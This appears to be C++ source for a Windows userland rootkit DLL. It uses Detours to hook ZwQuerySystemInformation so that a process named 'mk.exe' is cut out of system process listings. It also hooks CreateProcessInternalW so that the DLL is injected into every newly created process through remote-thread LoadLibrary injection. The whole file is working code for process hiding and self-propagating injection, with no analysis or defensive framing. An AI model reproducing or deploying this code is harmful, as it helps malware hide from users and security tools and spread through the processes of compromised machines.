#include "StdAfx.h"
#include "HOOK2.h"
#include "../Detours/detours.h"
#include "../publicdef/processhelper.hpp"

#define HIDE_PROC_NAME				_T("mk.exe")

lpCreateProcessInternalW g_lpCreateProcessInternalW = NULL;
DWORD g_dwSelfProcessID = -1;

ZWQUERYSYSTEMINFORMATION g_lpZwQuerySystemInformation = NULL;
BOOL InstallHook2()
{
	DWORD dwPid = ProcessHelper::ScanProcess(HIDE_PROC_NAME);
	g_dwSelfProcessID = dwPid;
	if ( 0 == g_dwSelfProcessID )
	{
		MessageBoxA(0, "please run mk first!", 0, 0);
		return(FALSE);
	}
	HMODULE ntdll_dll=NULL;

	if((ntdll_dll=GetModuleHandle(_T("ntdll.dll")))==NULL)
	{
		MessageBoxA(0,"GetModuleHandle() failed", 0, 0);
		return( FALSE );
	}

	if(!(g_lpZwQuerySystemInformation=(ZWQUERYSYSTEMINFORMATION)GetProcAddress(ntdll_dll,
		"ZwQuerySystemInformation")))
	{
		MessageBoxA(0,"GetProcAddress() failed", 0, 0);
		return( FALSE );
	}

 	HMODULE hKelnel32 = LoadLibrary(_T("Kernel32.dll"));
 	if (hKelnel32)
 	{
 		g_lpCreateProcessInternalW = (lpCreateProcessInternalW)GetProcAddress(hKelnel32, "CreateProcessInternalW");
 		if ( ! g_lpCreateProcessInternalW )
 		{
 			MessageBoxA(0, "CreateProcessInternalW failed",0 ,0);
 			return( FALSE );
 		}
 	}
	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());
	DetourAttach((PVOID *)&g_lpZwQuerySystemInformation, ZwQuerySystemInformationFack);
	DetourAttach((PVOID *)&g_lpCreateProcessInternalW, CreateProcessInternalWFack);
	DetourTransactionCommit();

	return TRUE;
}

NTSTATUS WINAPI ZwQuerySystemInformationFack(
	__in          SYSTEM_INFORMATION_CLASS SystemInformationClass,
	__in	      PVOID SystemInformation,
	__in          ULONG SystemInformationLength,
	__out_opt     PULONG ReturnLength
	)
{
  NTSTATUS Result = (g_lpZwQuerySystemInformation)(SystemInformationClass,SystemInformation,SystemInformationLength,ReturnLength);

  //一定要使用结构化异常处理，否则就有可能出现异常对话框。
    if(SystemInformationClass == SystemProcessesAndThreadsInformation && Result == 0 /* STATUS_SUCCESS */)
    {
      PSYSTEM_PROCESSES pProcessInfo;
      PSYSTEM_PROCESSES pPrevProcessInfo;

      pProcessInfo = (PSYSTEM_PROCESSES)SystemInformation;
      pPrevProcessInfo = pProcessInfo;

      while(true)
      {
        if(pProcessInfo != NULL && pProcessInfo->ProcessId == g_dwSelfProcessID)
        {
			//MessageBoxA(0, "pid, paat", 0, 0);
          if(pProcessInfo->NextEntryDelta == 0)
            pPrevProcessInfo->NextEntryDelta = 0;
          else
            pPrevProcessInfo->NextEntryDelta = pPrevProcessInfo->NextEntryDelta + pProcessInfo->NextEntryDelta;

          break;
        }

        if(pProcessInfo->NextEntryDelta == 0)
          break;

        pPrevProcessInfo = pProcessInfo;
        pProcessInfo = (PSYSTEM_PROCESSES)((char*)pProcessInfo + pProcessInfo->NextEntryDelta);
      }
    }
  return Result;
}

 void InjectProcess(HANDLE hProcess, LPCTSTR lpszDll)
 {
 	LPVOID lpBuffer = VirtualAllocEx(hProcess, NULL, (_tcslen(lpszDll) + 1) * sizeof(TCHAR), MEM_COMMIT, PAGE_READWRITE);
 	if (lpBuffer)
 	{
 		DWORD dwWritten;
 		WriteProcessMemory(hProcess, lpBuffer, lpszDll, (_tcslen(lpszDll) + 1) * sizeof(TCHAR), &dwWritten);
 		DWORD dwThreadId;
 		HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibrary, lpBuffer, 0, &dwThreadId);
 		if (hThread)
 		{
 			WaitForSingleObject(hThread, INFINITE);
 			CloseHandle(hThread);
 		}
 		VirtualFreeEx(hProcess, lpBuffer, 0, MEM_DECOMMIT);
 	}
 }
 
 BOOL WINAPI CreateProcessInternalWFack(HANDLE hToken,
	 LPCWSTR lpApplicationName,
	 LPWSTR lpCommandLine,
	 LPSECURITY_ATTRIBUTES lpProcessAttributes,
	 LPSECURITY_ATTRIBUTES lpThreadAttributes,
	 BOOL bInheritHandles,
	 DWORD dwCreationFlags,
	 LPVOID lpEnvironment,
	 LPCWSTR lpCurrentDirectory,
	 LPSTARTUPINFOW lpStartupInfo,
	 LPPROCESS_INFORMATION lpProcessInformation,
	 PHANDLE hNewToken)
 {
 	BOOL bRet = g_lpCreateProcessInternalW(hToken, lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes,
		bInheritHandles, CREATE_SUSPENDED | dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation, hNewToken);
 	if (bRet)
 	{
 		if (g_hModule)
 		{
 			TCHAR tszDllPath[MAX_PATH] = {0};
 			GetModuleFileName(g_hModule, tszDllPath, MAX_PATH);
 			InjectProcess(lpProcessInformation->hProcess, tszDllPath);
 		}
 		ResumeThread(lpProcessInformation->hThread);
 	}
 	return bRet;
 }